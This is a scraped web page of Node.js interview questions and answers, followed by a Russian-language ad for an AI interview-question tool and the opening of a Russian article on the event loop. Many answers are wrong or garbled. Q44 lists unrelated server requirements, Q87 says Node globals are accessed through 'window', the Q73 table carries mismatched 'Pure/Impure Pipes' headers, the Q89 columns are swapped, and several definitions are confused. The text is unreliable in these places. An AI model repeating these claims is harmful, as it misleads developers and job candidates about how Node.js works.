The Read Eval Print Loop (REPL) performs these four tasks - Read, Evaluate, Print and Loop. The REPL is used to execute ad-hoc Javascript functions. The REPL shell allows direct entry of javascript into a shell prompt and evaluates the results. REPL is very critical for testing, debugging, or experimenting.

Q9. How is Node.js different from Ajax?
Answer
Node.js and Asynchronous JavaScript and XML (Ajax) are the advanced implementations of JavaScript. Ajax is designed for dynamically updating a section of a page’s content, without having to update the entire web page. Node.js is utilized for developing client-server applications.

Q10. What is the difference between Nodejs and jQuery?
Answer
Both Node.js and jQuery are the advanced implementations of JavaScript. Node.js is a server-side platform for developing client-server applications. However, Node.js can also run on a server similar to Apache and Django, but not in a browser. jQuery is a JavaScript module that complements AJAX, looping, DOM traversal. It provides useful functions that help in JavaScript development. jQuery also manages cross-browser compatibility and can help produce extensive web applications.

Point to be noted: Go through this Q&A very thoroughly as this is one of the critical node js interview questions.

Q11. What is chaining in Node.js?
Answer
This is a mechanism by which the output of one stream is connected to the output of another stream y creating a long chain of multiple stream operations.

Q12. What do you mean by “streams”? What are the different types of streams in Node.js?
Answer
Streams are the objects that allow and enable the continuous process of reading the data from the source code and writing the data to the destination.

Streams are of four types:

Facilitate reading operation (Readable).
Facilitate writing operation (Writable).
Facilitate both reading and writing operations (Duplex).
Kind of duplex stream that performs the computations based on the available inputs (Transform).
Q13. What are the exit codes in Node.js? Can you list a few exit codes?
Answer
Exit codes are the specific codes that can be used to end a process. Some of the examples of exit codes are, Uncaught Fatal Exception, Fatal Error, Non-function Internal Exception Handler, Internal Exception handler Run-Time Failure, Internal JavaScript Evaluation Failure, etc.

Q14. Why Node JS is different from Angular JS?
Answer
Node JS is used to develop server side applications but Angular JS is used to client side applications.

Node JS was developed by Ryan Dahl in 2009 but Angular JS developed by Misko hevery( Google developer ) in 2008 and 2009.

Both are open-source tools that is used to create isomorphic web applications

Q15. What is Promises in Node JS?
Answer
It is a returned value by an asynchronous function to indicate the completion of the processing carried out by the function.

var promise = doSomethingAync()



promise.then(onFulfilled, onRejected)

Q16. What is Stub in Node JS?
Answer
It is the process of creating fake endpoints in code so that we can delay writing complex code.

It is compatible with Node js
It comes with predefined or usable extensions
It is simple,lightweight
Q17. How we can secure HTTP cookies against XSS attacks?
Answer
we have to set flags on the set-cookie HTTP header:

HttpOnly
secure
After this it will lokk like this : Set-Cookie: sid=; HttpOnly

Point to be noted: Make sure that you go through this twice as this is the favorite node js interview questions for fresher and experienced as well.

Q18. What is the role of require() in Node JS?
Answer
It is used to include modules from external files. It takes one string parameters( location of file ) that we want to include.

require('file location')

Q19. Why is Node.js single-threaded?
Answer
It was created especially as an examination in async processing. The hypothesis was that performing async processing on to a single thread could give more execution and adaptability under average web loads than the common thread-based usage.

Q20. How do you update NPM to a new version in Node.js?
Answer
$ sudo npm install npm -g

/usr/bin/npm -> /usr/lib/node_modules/npm/bin/npm-cli.js

npm@2.7.1 /usr/lib/node_modules/npm

Q21. Explain Event Loops in Node JS?
Answer
It is a single-threaded application, but it can support the concept of event and callbacks.
Q22. What is a buffer and stream in Node.js?
Answer
Buffer
It is a global class that can be accessed in an application without importing the buffer module. It can be constructed in a variety of ways like var buf = new Buffer(5);

Use of a buffer in Node JS
Buffer is used to dealing with TCP streams, reading, and writing data to the filesystem in the Node.js server, which are purely binary teams of data.

It is designed in a way that is easy to manage, faster and has an API designed for binary data, which makes it the perfect choice for handling streams of data.

Stream
these are the objects that allow the developers to read the data from the source or can write the data to the destination in an endless manner. They usually have problems with the large data. With a stream, there is no need to wait for the whole resource to load.

There are different types of Stream:

Readable
Writable
Duplex
Transfer
Q23. What is Piping in Node JS?
Answer
A pipe is a function that reads the data from a readable stream once it is available and writes it in the destination writable stream. It performs all the reasonable things including the errors, files in case any one side falls apart. In due case, piping redirections any readable stream to a writable stream.

Q24. List some events that fired by streams in Node JS?
Answer
newListener
removeListener
EventEmitter: 'removeListener'
EventEmitter. listenerCount (emitter, eventName)
EventEmitter.defaultMaxListeners
emitter.addListener(eventName,listener)
emitter.emit(eventName[,...args])
Q25. How we can open a file in Node JS?
Answer
open() function is used to opens a file by passing a file name.

Syntax : fs.open(path, flags[mode], callback)

Parameters

path : It is a string having file name with complete path
flags : It indicates the behavior of the file to be opened
mode : It sets the file mode like permission
callback : gets two arguments (err, fd)
var fs = require("fs");



// Asynchronous - Open a File

console.log("open file");

fs.open('file.txt', 'r+', function(err, fd) {

   if (err) {

      return console.error(err);

   }

   console.log("File opened");     

});

Q26. How we can read a file in Node JS?
Answer
Syntax of read a file is given below:-

fs.read(fd, buffer, offset, length, position, callback)

var fs = require("fs");

var buf = new Buffer(1024);



console.log("open existing file");

fs.open('file.txt', 'r+', function(err, fd) {

   if (err) {

      return console.error(err);

   }

   console.log("File opened");

   console.log("read the file");

   

   fs.read(fd, buf, 0, buf.length, 0, function(err, bytes){

      if (err){

         console.log(err);

      }

      console.log(bytes + " bytes read");



      if(bytes > 0){

         console.log(buf.slice(0, bytes).toString());

      }

   });

});

Q27. How we can write a file in Node JS?
Answer
Syntax of write a file is given below :-

fs.writeFile(filename, data[, options], callback)

var fs = require("fs");



console.log("Write in existing file");

fs.writeFile('file.txt', 'This is test msg', function(err) {

   if (err) {

      return console.error(err);

   }  

   console.log("Written successfully!");

   console.log("Read latest written data");

   

   fs.readFile('file.txt', function (err, data) {

      if (err) {

         return console.error(err);

      }

      console.log("Read: " + data.toString());

   });

});

Q28. How we can close a file in Node JS?
Answer
Syntax of close a file is given below :-

fs.close(fd, callback)
Q29. How we can delete a file in Node JS?
Answer
Syntax of delete a file is given below :-

fs.unlink(path, callback)
Q30. What are the difference between setTimeout() and clearTimeout()?
Answer
setTimeout() : It can be used to schedule code execution after a designated amount of milliseconds.

function myFunc(arg) {
  console.log(`arg was => ${arg}`);
}
setTimeout(myFunc, 1500, 'funky');

clearTimeout()  :  It can be used to cancel timeout which are set by setTimeout().

console.log('before immediate');
setImmediate((arg) => {
   console.log(`executing immediate: ${arg}`);
}, 'so immediate');
console.log('after immediate');

Q31. How many types of API in Node JS?
Answer
There are two types of API in Node JS.

Blocking functions
Non-blocking functions
Q32. What is test pyramid? Explain with an example?
Answer
A test pyramid is a metaphor that helps the grouping of software tests in a bunch of different granularity. Unit testing pyramid number of tests gets easily fitted.

For instance, unit testing, component testing, integration testing, system testing, end-to-end testing, UI testing, and others. The primary example of it is creating a unit test which will be the fastest and reliable.

node interview questions

Q33. What is the timing features of Node.js? Explain some Timers modules?
Answer
The timing feature of node.js contains all the necessary functions that are required to execute code after any specific period. As it is built on the V8 JavaScript engine of Google Chrome, hence its library permits the fast execution of code. Timers also provide a number of ways for managing schedules. They don't need to be imported as all the methods are easily available for the browser.

Some modules are –
setTimeout
setInterval
setImmediate
clearImmediate(immediate)
clearTimeout(timeout)
Q34. Why we have to keep separate Express app and server?
Answer
Express app encapsulates your API logical, which is your data abstraction. This is where you should keep up your DB logic or data models.

The server should be differently handled as its sole responsibility is to keep the app/website running. The separation of concerns will lead to optimization.

Q35. What is the difference between setImmediate() and setTimeout()?
Answer
setImmediate() executes a script once the current poll or the event loop phase has completed.

setTimeout() is used to schedule scripts to be run after a minimum threshold has elapsed.

The order in which these timers are executed varies on the context in which they are used. If both are called from within the module, timing will be bound by the process performance.

Q36. How Node.js and JavaScript are related?
Answer
Node.js appeared when the engineers of JavaScript expanded it from something you could just keep running in the browser to something you could keep running on your machine as an independent application. The Node run-time environment incorporates all that you have to execute a program written in JavaScript.

Q37. List some tools and IDEs that are used in Node.js
Answer
Some tools and IDEs are -
Mocha.js
Chai
Sinon.js
Express.js
WebStorm IDE
Passport.js
Cloud9
IntelliJ IDEA
Sublime text
Q38. Define an error-first callback?
Answer
Error-first callbacks are generally used to pass errors as well as data. It is important to pass the error as the first parameter, and then you must check if something went wrong. There are additional arguments that are used to pass data.

Q39. Difference between operational and programmer errors in Node JS?
Answer
Operational errors	programmer errors
They are not a bug	They are the actual bug
They are not a bug	They are the actual bug
They can't corrupt	can corrupt the whole system
It refers to know cases	It refers to unknown cases
Example: you can consider request timeout for any hardware failure
Q40. In Node.js, which framework is used commonly?
Answer
Hapi.js or Express.js is robust and modular for developing the APIs. It has input validation, configuration functioning, and many other features.

Q41. What is Express js?
Answer
Express js is a type of framework which is used for node js. It released under the MIT License. It helps to manage a server and routes. It is also designed for building web applications and APIs.

It was founded by TJ Holowaychuk. The first release of express js was on the 22nd of May, 2010. Version 0.12.0.

Features of Express framework:
It can be used to design single-page or multi-page web applications.
It helps to setup middlewares to respond to HTTP Requests.
It helps us to render HTML Pages dynamically.
Q42. What is the command for import external libraries in Node JS?
Answer
Command “require” is used in Node JS for import external libraries. Mentioned below is an example of this. “var http=require (“http”)”. This will load the library and the single exported object through the HTTP variable.

Q43. What is the disadvantages of Node.js?
Answer
Node.js lacks consistency, and its API changes frequently.
It requires more time for development, which affects productivity.
Users who prefer heavy computing applications cannot find it reliable
It is advanced, but there are a few poor qualities of tools present in it.
Q44. Is there any system configration needed to install Node JS?
Answer
Yes, system configuration need to install nodejs that's are given below-

64-bit architecture
Kernel version 3.10 or higher
One of the following Linux flavors

Ubuntu 14.04 / 15.10
CentOS 6.x
Red Hat Enterprise Linux (RHEL) 7.x
Debian 7.7
4 or more CPUs/cores

At least 16 GB of memory/RAM
At least 25 GB of disk space
Ports opened for inbound TCP traffic:

8800 (admin console)
8080 (registry)
8081 (website)
Access to the public internet, either directly or via proxy

Q45. Why is the importance of a consistent style? What tools can help you assure a consistent style?
Answer
Consistent style can help your team members modify projects easily without the need to learn a new style for every project. Some of the useful tools are Standard and ESLint.

Q46. What is a Reactor Pattern in Node.js?
Answer
Reactor Pattern is used for non-blocking Input/Output operations in the Node.js. This pattern provides a handler that is associated with I/O operations. When I/O requests are generated, they get submitted to a demultiplexer, which handles concurrency in non-blocking I/O mode and collects requests in the form of an event and queues the events.

Note: This Node js interview questions have been created by Node.js Experts. It shall help you to answer some of the most frequently asked questions during a job interview.

Q47. What are LTS releases? Why are they important?
Answer
The Long Term Support (LTS) version of Node.js receives all of the critical bug fixes, performance improvements, and security updates. The LTS versions are supported for at least 18 months and are always even version numbers. They are best for production because the LTS release line focuses on stability and security.

Q48. What are the global installations of dependencies?
Answer
They have globally installed packages or dependencies that are stored in the /npm directory. These dependencies can be used in Command Line Interface (CLI) of any node.js. However, they cannot be imported using require () command in Node application directly. In order to install a Node project globally, you need to use -g flag.

Q49. What are the local installations of dependencies?
Answer
Local mode is the package installation in the node-modules directory in the same folder where Node application is stored. By default, the Node Package Manager (NPM) installs dependencies in the local mode. Most locally deployed packages are also accessible via require(). In order to install a Node project locally, you need to follow the syntax.

Q50. How to uninstall a dependency using the NPM?
Answer
You can try the following command for uninstalling the module.

C:\Nodejs_WorkSpace>npm uninstall dependency-name

Q51. What is EventEmitter in Node.js?
Answer
EventEmitter class lies in the events module and is accessibly through the following syntax:

//import events module
var events = require('events');
//create an eventEmitter object
var eventEmitter = new events.EventEmitter();

In case an EventEmitter instance is facing error, it emits 'error' event. When a new listener is added, the 'newListener' event gets fired and when a listener gets removed, 'removeListener' event gets fired.

nodejs interview questions

Q52. What are the differences between synchronous and asynchronous methods of the fs module?
Answer
Every method in the fs module contains synchronous as well as asynchronous form. Asynchronous methods take the last parameter as completion function callback and the first parameter as an error. It is advisable to use asynchronous methods instead of synchronous methods because asynchronous would never block the program execution, but synchronous may block.

Q53. What is V8 Engine in Node JS?
Answer
V8 Engine is Google's open-source javascript and written in C++. It is used inside Google Chrome. It was first designed to increase the performance of JavaScript execution inside web browsers.

Q54. How to pass an array in insert query using node js?
Answer
The array of records can easily be bulk inserted into the node.js. Before insertion, you have to convert it into an array of arrays.

var mysql = require('node-mysql');

var conn = mysql.createConnection({

     // your database connection

});



var sql = "INSERT INTO Test (name, email) VALUES ?";

var values = [

    ['best interview question', 'info@bestinterviewquestion.com'],

    ['Admin', 'admin@bestinterviewquestion.com'],

];



conn.query(sql, [values], function(err) {

     if (err) throw err;

     conn.end();

});

Q55. How to use Async Await with promises in node js?
Answer
Step1. Install Async first with "npm install async" command
Step2. Call the async in your file with you will use async.
var async = require("async");
Step3. Make an async function and call await function inside async function.
let phoneChecker = async function (req, res) {
     const result = await phoneExistOrNot();
}
exports.phoneChecker = phoneChecker;

await will work only under async function.
For example: here is " phoneChecker " is async function, and phoneExistOrNot is await service.
Step4. Now you can write your logic in await function.
let phoneExistOrNot = async function (req, res){
    return new Promise(function(resolve, reject) {
        db.query('select name, phone from users where phone = 123456789 ', function (error, result) {
             if(error) {
                 reject(error);
                 console.log('Error');
             } else {
                  resolve(result);
                  console.log('Success');
             }
      })
});
}
Related Article: How to use async-await in node js
Q56. How to get a user's IP address in node js?
Answer
You can use req.connection.remoteAddress to a user's IP address in node js.

Q57. Explain the difference between const and let in node js?
Answer
S.no	let	const
1.	It can be reassigned, but can’t be redeclared in the same scope.	It can be assigned an initial value, but can’t be redeclared in the same scope, and can’t be reassigned.
2.	It is beneficial to have for the vast majority of the code. It can significantly enhance your code readability and decrease the chance of a programming error.	It is a good practice for both maintainability, readability and avoids using magic literals
Q58. How to connect MySQL database using node js?
Answer
If you don't install MySQL then you can install MySQL by npm install mysql.

Create Connection


You can write connection code in a single file and call in all pages where you need to interact with database.



var mysql = require('mysql');

var con = mysql.createConnection({

host: "localhost",

user: "your database username",

password: "database password"

});



con.connect(function(err) {

if (err) throw err;

console.log("Database Connected!");

});



 

Q59. What is the request object in nodejs?
Answer
The request object in Node JS represents an HTTP request plus it has properties such as req.app, req.baseURL, etc. to serve the request query parameters, string, body, and HTTP headers, etc.

Q60. What is nodemon and how it can we used?
Answer
Nodemon is that tool which helps to develop application based on node.js by automatically re-initiating the application of node whenever the file changes inside the directory get detected.

It does not need any further changes to the code or the development method. Nodemon is the replacement wrapper of Node, to practice Nodemon replace the node word on the line of command at the time of executing the script

Q61. What is the purpose of module.exports in Node.js?
Answer
In Node.JS, module.exports is a special object that is included in every JavaScript file present in the Node.JS file default. Here module is a variable that represents the current module, and export is the object that will be exposed as the module.

Here we export a string from testYourModule.js file

// testYourModule.js

module.exports = "Best Interview Questions provides an example of module.exports"



// index.js

const params = require('./testYourModule.js')

console.log(params )

Q62. How to send Email using Node.js?
Answer
Related Article: How to send Emails using Node.js
Q63. What is the difference between callback and promise?
Answer
When one function simply allows another function being the argument, this enclosed function is called the callback function. And using this callback function is one core concept of functional programming, and the user can also find them inside the most of the JavaScript codes- either inside the simple functions such as setInterval, or event listening or at the time of making the API calls.

The promise, on the other hand, is practiced to manage the asynchronous outcome of one operation. JavaScript has been designed such that it can not wait so that the asynchronous code block can execute completely before the other synchronous code parts can run. With the help of Promises, the users are able to delay the code block execution until the async request gets completed. In this manner, all other operations get to keep running that too without any interruption.

Q64. How to call multiple Promises?
Answer
Promise.all([p1, p2]).then(values => {
   console.log(values); // [7, "123"]
});

Q65. Why we use express in node JS?
Answer
ExpressJS is one prebuilt framework of NodeJS that can assist the users in building server-side web apps faster plus smarter. Simplicity, flexibility, minimalism, scalability are a few of its many characteristics and as it is built inside NodeJS itself, Express inherited its execution as well.

ExpressJS streamlined coding in Node JS to a great extent and provided programmers some extra features to increase their coding of the server-side. There is no doubt in the fact that it is the most famous frameworks of all in today’s time.

Q66. What is REST API in node JS?
Answer
Representational State Transfer or REST is a standard web-based architecture. REST makes use of the HTTP Protocol. It twirls around resources where each and every element is one resource and the resource is obtained by the common interface with the help of standard HTTP methods. This was first proposed by a man named Roy Fielding in the year 2000. The REST Server solely renders entrance to resources as well as REST client accesses plus modifies these resources with the help of the HTTP protocol. And here each and every resource is recognized by URIs or by global IDs. It uses numerous representations to present the resource such as text, or JSON, or XML, etc.

Q67. Are promises better than callbacks?
Answer
With the help of Promises, Handling error across numerous asynchronous calls has become more effortless in comparison to what it was at the time of using callbacks. Also, having the privilege to not provide any callbacks makes the coding look even cleaner. On the contrary, callbacks present the mechanism of control flow. And they only inform the users about how the application flows, and not really the information of what it does.

Q68. How do you secure an API in Node.js?
Answer
The paper “The Protection of Information in Computer Systems” by Jerome Saltzer and Michael Schroeder, cited some 8 principles with the help of which information within the computer systems can be stored efficiently. These are mentioned below :

Least Privilege
Fail-Safe Defaults
Mechanism Economy
Complete Meditation
Open Design
Privilege Separation
Least used Mechanism
Psychological Acceptability
Q69. Why we use Bodyparser in node JS?
Answer
It extracts the complete body portion owned by the stream of the incoming requests and exposes this extraction on the “req.body like something that is easier to interact with. This renders the user the middleware that uses the nodeJS or the zlib for unzipping the incoming data of request if it is zipped plus stream-utils or the raw-body in order to anticipate the full and raw contents belonging to the body of the request before "parsing it".

Q70. Which is more secure SOAP or REST?
Answer
The point of differences mentioned below will help you to understand which one is more secure and when:

If standardization and security are the main goals, then SOAP should be considered as the stronger one to practice as the Web Services. Also, SOAP offers WS-Security which is like an extra perk to the enterprise.
The REST API is compatible with a number of types of data outputs including JSON, XML, CSV while SOAP is able to handle XML only. With the help of REST using JSON helps to cut down a lot on the expenses.
REST is further advanced, therefore when the next endpoint requests one query completed beforehand, the development of API can make use of the data that too from the earlier request. Whereas, SOAP implementations need to process all the queries each and every single time.
Although it sounds as if SOAP is more advantageous than REST, yet one good REST implementation can be really beneficial for an enterprise rather than using the poorly-designed SOAP API. And SOAP possesses in-built error handing to communicate errors through the specification of WS-ReliableMessaging. Whereas, REST needs to send the transfer again every time it encounters one error.

Q71. What is the difference between JWT and OAuth?
Answer
JSON Web Token is shortly verbose, this makes JSON compact in terms of size. And JWT becomes the better choice in order to be practiced in HTML plus HTTP environments. And the usage of JWT on the Internet-scale rises the efficiency concerning client-side processing of the tokens on numerous platforms simultaneously.

Q72. What is callback hell, and how can it be avoided?
Answer
Callback hell is a situation in Javascript when you face callbacks within callbacks or nested callbacks.

It looks somewhat like this:

firstFunction(args, function() {
   secondFunction(args, function() {
      thirdFunction(args, function() {
      });
   });
});

There are two significant ways to avoid Callback Hell in NodeJS:

1. Using Promises
const makeBurger = () => {
    return getChicken()
    .then(chicken => cookChicken(chicken))
};
makeBurger().then(burger => serve(burger));

See, it is just more easy to read and manage in comparison to the nested callbacks.

2. Use Async/Await
Using Asynchronous functions, we can convert makeBurger into one synchronous code. Also, maybe you can get helpers to getBun and getChicken at the same time, meaning, you can use await with Promise.all. Here's the code:

const makeBurger = async () => {
    const cookedChicken = await cookChicken(chicken);
    return cookedChicken;
};
makeBurger().then(serve);

Q73. What is the difference between readFile vs. createReadStream in Node.js?
Answer
Pure Pipes	Impure Pipes
This will thoroughly read the file into the memory before making it available to the user.	It will read chunks of a file as per specifications provided by the user.
Since the whole data is sent after it has been loaded, it will take time for the client to reach and hence, is slower.	Since it reads files in chunks, the client will read the data faster than in readFile.
It is easier to clean the non-used memory by Node.js in this.	It is much more difficult for Node.js to clean up memory in this case.
It will not scale the requests at a given time, preferably all at once.	It will pipe the content directly to the client using HTTP response objects, making it time-saving.
Note: Our aim while creating nodejs interview questions, is to help you grow as a Node Developer. The questions mentioned here have been asked by leading organizations during technical rounds of the interview process.

Q74. Why are promises better than callbacks?
Answer
Here are some of the reasons why promises are better than callbacks:

They are built over callbacks and very efficient abstractions.
They allow cleaner and better functional code.
They end up with fewer error-prone boilerplate.
They provide a catching mechanism that is not available in Callbacks.
You have a superior level of control and trust while delegating tasks through promises rather than callbacks.
Q75. What are the different HTTP methods in Node.js?
Answer
There are three HTTP methods in NodeJS. They are:

http.createServer(): This is used to create a new instance of the http.server class.
http.request(): This is used for making an HTTP request to the server by creating an instance of the http.ClientRequest class.
http.get(): It is very much similar to the http.request() method, but it automatically sets the HTTP method to GET and calls the req.end().
Also Read: What's New for Node.js in 2020
Q76. What is UUID, and how you can generate it in Node.js?
Answer
A UUID is a Universal Unique Identifier is a method for generating ids that have been standardized by the Open Software Foundation (OSF).

You can generate UUIDs in Node.js through the node-UUID. It is a speedy and straightforward way of generating Version 1 & 4 UUIDs.

Here's how to generate UUIDs
Install the node-uuid through the npm manager using npm install uuid.
Use it in your script like this:
const uuidv1 = require('uuid/v1')
const uuidv4 = require('uuid/v4')
var uuid1 = uuidv1()
var uuid5 = uuidv4()

Here is how your output would look. Although, due to the nature of UUIDs, your generated IDs may be completely different.

Output
uuid1 v1 => 6bf958f0-95ed-17e8-sds37-23f5ae311cf6
uuid5 v4 => 356fasda-dad8d-42b7-98b8-a89ab58a645e

 

Q77. How will you debug an application in Node.js?
Answer
The easiest way to debug an application on Node.js is through Node-Inspector. You can use it from any browser supporting WebSockets. It helps multiple ways of debugging like a profiler, livecoding, breakpoints, etc. Here's how to use node-inspector:

Install it using npm install -g node-inspector
Now, run node-debug app.js
Q78. What do you understand by middleware? How can you use middleware in Node JS?
Answer
Middleware functions are those functions having access to the request object (req), the response object (res), and also the next function in an application's request-response cycle. The following function is basically a function in the Express router, when invoked, executes the middleware which is succeeding in the current middleware.

Middlewares can perform the following tasks:
Execute any type of code
Making changes to the request and response objects
We are ending the request-response cycle.
Cleaning the next middleware in the stack
Q79. How is observable different from promise?
Answer
Observables	Promises
These are used for streams of events over time.	It is able to handle only one event.
It supports operators such as map, filter, reduces, etc., and is cancel-able and retry-able.	It is not easy to handle and returns a single value.
It provides chaining and subscriptions for handling complex applications.	It uses only the .then() clause.
Here the subscribe method is used for a centralized and predictable error handling.	It pushes the errors to the child's promises.
Note: This node js interview questions have been created by seasoned Node.js experts. It shall help you to answer some of the most frequently asked questions during a job interview.

Q80. What is Tracing in Node.js?
Answer
Tracing is a mechanism in Node.js to provide a centralized tracing information method, which is generated by V8, Node.js core, and the userspace code. It can be enabled with the --trace-event-categories command-line flag or by using the trace_events module.

Q81. What is the use of CORS in Node JS?
Answer
CORS is a Node.js package used for providing a Connect/Express middleware.

app.use(function(req, res, next) {

  res.header("Access-Control-Allow-Origin", "*");

  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");

  next();

});

Q82. How do you write a callback function in node JS?
Answer
A callback function is an asynchronous equivalent for a function. It's called at the completion of each and every task. In Node.js, callbacks are generally used, and all the APIs of Node are written in a way to support callback functions.

When a function starts reading a file, it returns the control to the execution environment immediately so that the next request can be executed, and this is a perfect example of a callback function.

Here’s how to write a callback function in Node.js:



var myCallback = function(data) {

  console.log('got data: '+data);

};



var usingItNow = function(callback) {

  callback('get it?');

};

Q83. What is spawn in Node JS?
Answer
The spawn is a method in NodeJS that spawns an external application through a new process and finally returns a streaming interface for I/O. It is excellent for handling applications that produce a large amount of data or for working with streams of data as it reads in.

Here’s an example how child process have the ability to use the spawn method:



const { spawn } = require('child_process');

const ls = spawn('ls', ['-lh', '/usr']);



ls.stdout.on('data', (data) => {

  console.log(`stdout: ${data}`);

});



ls.stderr.on('data', (data) => {

  console.error(`stderr: ${data}`);

});



ls.on('close', (code) => {

  console.log(`child process exited with code ${code}`);

});

Q84. What are the pros and cons of using promises instead of callbacks?
Answer
Here are the pros of using promises over callbacks:
Better defined and organized control flow of asynchronous logic.
Highly reduced coupling.
We have integrated error handling.
Enhanced readability.
Cons of using Promises over callbacks:
It kills the purpose of asynchronous non-blocking I/O.
Only one object can be returned.
We cannot return multiple arguments.
Q85. How does Passport handle authorization?
Answer
Passport is an authentication middleware that is extremely flexible and modular. Any application might need to incorporate a user's information through third-party services. In this particular case, the application will send out a "connect" request with the user's Twitter or Facebook accounts.
Authorization is handled by calling passport.authorize(). If the authorization is granted, the result by the verify callback shall be assigned to the req.account.

Here's how authorization of a Twitter account is handled in Passport.

app.get('/connect/twitter',

  passport.authorize('twitter-authz', { failureRedirect: '/account' })

);



app.get('/connect/twitter/callback',

  passport.authorize('twitter-authz', { failureRedirect: '/account' }),

  function(req, res) {

    var user = req.user;

    var account = req.account;



    account.userId = user.id;

    account.save(function(err) {

      if (err) { return self.error(err); }

      self.redirect('/');

    });

  }

);

Q86. How do you make node JS secure?
Answer
Here are some best practices to make your NodeJS application secure:

Limit the number of concurrent requests through middleware such as cloud firewalls, cloud load balancers, etc.
Adjust the HTTP response using secure headers for enhanced security and blocking vulnerabilities such as XSS, clickjacking, etc.
Use a secure hash + salt function such as bcrypt to store passwords, API keys, and secrets instead of Node.js crypto library.
Limit brute-force authorization attacks by limiting the number of failed login attempts and, in such a case, ban the user's IP address.
Limit your payload size by using a reverse-proxy or a middleware.
Avoid pushing secrets on to the npm registry.
Use cookies securely
Ensure the security of all your dependencies
Q87. What are Global objects, and how do you use it in node JS?
Answer
Global objects are those who provide variables and functions that are available anywhere within the code. By default, they are those objects which are built into the language or the environment.

All the properties of Global Objects can be accessed directly in node.js using the window.

window.currentUser = {

    name: "Best Interview Question"

};

Q88. What is the fork in node JS?
Answer
Fork() is used to spawn a new Node.js process. It invokes a specific module with an IPC communication channel, thus enabling the sending of messages between a parent and child.

const { fork } = require('child_process');



const forked = fork('child.js');



forked.on('message', (msg) => {

     console.log('Message from child', msg);

});



forked.send({ hello: 'world' });

Q89. What is the difference between the node js child process and clusters?
Answer
Child Process	Clusters
It is a module of Node.js containing sets of properties and functions helping developers throughout the forking process.	These can be easily spun using Node's child_process module and can communicate with each other using a messaging system.
It occurs when you have two or more node instances running with one master process routing.	It spawns a new script or executable on the system.
Q90. What is an Event Loop?
Answer
The event loop is the thing that allows Node.js to operate the non-blocking input/output operations. Despite the originality, JavaScript is a single-threaded that is used for offloading the operations to the kernel of the system, when possible.

Event Loop
It allows Node JS to perform non-blocking I/O operations despite the fact. In Node.js codes runs on a single thread.
Phases of the Event loop
Timers
Pending Callbacks
Idle, Prepare
Poll
Check
Close Callbacks
Phases of Event Loop
console.log("This is first title");

setTimeout(function(){

    console.log("This is second title");

}, 1000);

console.log("This is third title");



OUTPUT



This is first title



This is third title



This is second title



 

Q91. Why node is faster than others?
Answer
Multiple reasons are listed below:

In the comparison of HTTP servers, it provides the non-blocking of the input/output.
Node reduces the total number of servers that serve an equal amount of requests.
This uses the single process for managing the multiple requests.
By using the single-thread process, the computing speed will get increased and it also saves a lot of space.
Q92. Why we used async & await?
Answer
Async and await are used to make the code easier to write and read. Also, the agenda behind rolling out this feature is to deal with the promises and functions chaining in the Node. Where the functions do not need to be chained just one after another, simply call the await function that returns the promise. On the other hand, the function async should be declared before returning a promise by awaiting a function.

ИИ-интервьюер
Высокоэффективный инструмент для подготовки к собеседованию
На базе aspose.com, aspose.net и aspose.cloud

Подготовьтесь к собеседованию на должность разработчика Node.js
С помощью приложения Node.js Interview у вас будет возможность подготовить и уточнить свои ответы на широкий спектр вопросов, с которыми вы, вероятно, столкнетесь на реальном собеседовании. Просто введите "Программист Node.js" в качестве должности, а ИИ предоставит вам полный список подходящих вопросов для самопроверки.

Для HR-менеджера наше приложение - инструмент создания сценариев собеседований с разработчиком Node.js. Генератор вопросов на основе искусственного интеллекта гарантирует, что вы затронете все важные области - от технических навыков, связанных с Node.js, до поведенческих качеств - для должности, на которую вы нанимаете.

Генератор вопросов для собеседования по Node.js
В настоящее время рынок труда программистов Node.js является высококонкурентным. Правильная подготовка имеет решающее значение для успеха серьезного соискателя работы.

С помощью этого приложения Node.js Interview вы можете быстро подготовиться и подать заявку на желаемую работу. Просто введите в поле "Разработчик Node.js", добавьте необходимые сведения о должности (например, "Старший", "Средний", "Младший") и нажмите кнопку, чтобы получить список вопросов для собеседования. Используйте их в качестве практики, укрепите уверенность в себе и подготовьтесь к собеседованию максимально эффективно.

Начните свой путь к успешным собеседованиям сегодня с помощью нашего генератора вопросов для собеседований по Node.js!

Как подготовиться к собеседованию по Node.js
Укажите подробную информацию о желаемой должности (младший, средний, старший).
Укажите количество вопросов для собеседования по Node.js.
Нажмите кнопку, чтобы автоматически сгенерировать вопросы для интервью.
Сохраните вопросы интервью по Node.js в виде документа на своем устройстве.

6 главных вопросов на собеседовании по Node.js
May 15, 2023
Что такое цикл событий, как он работает и почему о нем все всегда спрашивают на собеседованиях? Некоторое время я не мог четко ответить на этот вопрос, а уже потом, когда набрался опыта и сам начал нанимать людей, стало понятно, что это реально большой пробел у большинства JavaScript-разработчиков.

1 Что такое Event Loop в Node.js
Event Loop — это цикл, с помощью которого Node.js может выполнять неблокирующие операции I/O — input/output. И еще очень важно, что Event Loop — это «сердце» большого механизма известной библиотеки libuv. 

Теперь мы рассмотрим, что внутри Event Loop:


Фазы — это то, о чем далеко не все знают или говорят, но знание фаз и есть фундамент для понимания последовательности выполнения кода, написанного на JavaScript.



2 Расскажите о фазах
Timers: фаза, в которой выполняются коллбэки, запланированы setTimeout()и setInterval().
Pending callbacks: выполняет I/O-коллбэки, отложенные до следующей итерации цикла.
Idle, prepare: использовать только внутри.
Poll: получение новых событий I/O; выполнять коллбэки, связанные с I/O (почти все, за исключением выполняемых в фазе коллбэков close callbacks, запланированных таймерами и setImmediate()); при необходимости node может здесь блокироваться.
Check: здесь вызываются setImmediate() callbacks.
Сlose callbacks: закрывает коллбэки, такие как socket/http/eventEmitter/.on(‘close', () =>).
С полной информацией о фазах можно ознакомиться здесь.



3 Что такое микро- и макрозадачи
разницу между setTimeout()i setImmediate();
разницу между process.nextTick()и setImmediate();
какие трудности можно решить с помощью process.nextTick().


4 В чем разница между setTimeout() и setImmediate()
setTimeout() — коллбэк, который мы передаем в таймер, выполняется после определенного пройденного времени, переданного вторым аргументом setTimeout()или при отсутствии указанного времени, по умолчанию через 4 мс.

setImmediate() выполняется после текущей poll-фазы:

const fs = require('fs');

fs.readFile(__filename, () => {
  setTimeout(() => {
    console.log('Timeout');
  }, 0);
  setImmediate(() => {
    console.log('Immediate');
  });
});
Результат:

Immediate
Timeout
Но что важно, зависимость от контекста, в котором находятся функции, влияет на то, чей коллбэк выполнится первым.

Когда мы используем оба таймера в логике, работающей с I/O, как в примере сверху, то setImmediate() будет всегда первым при условии, что передаваемые в них коллбэки будут схожи по логике или идентичны.

setTimeout(() => {
  console.log('timeout');
}, 0);
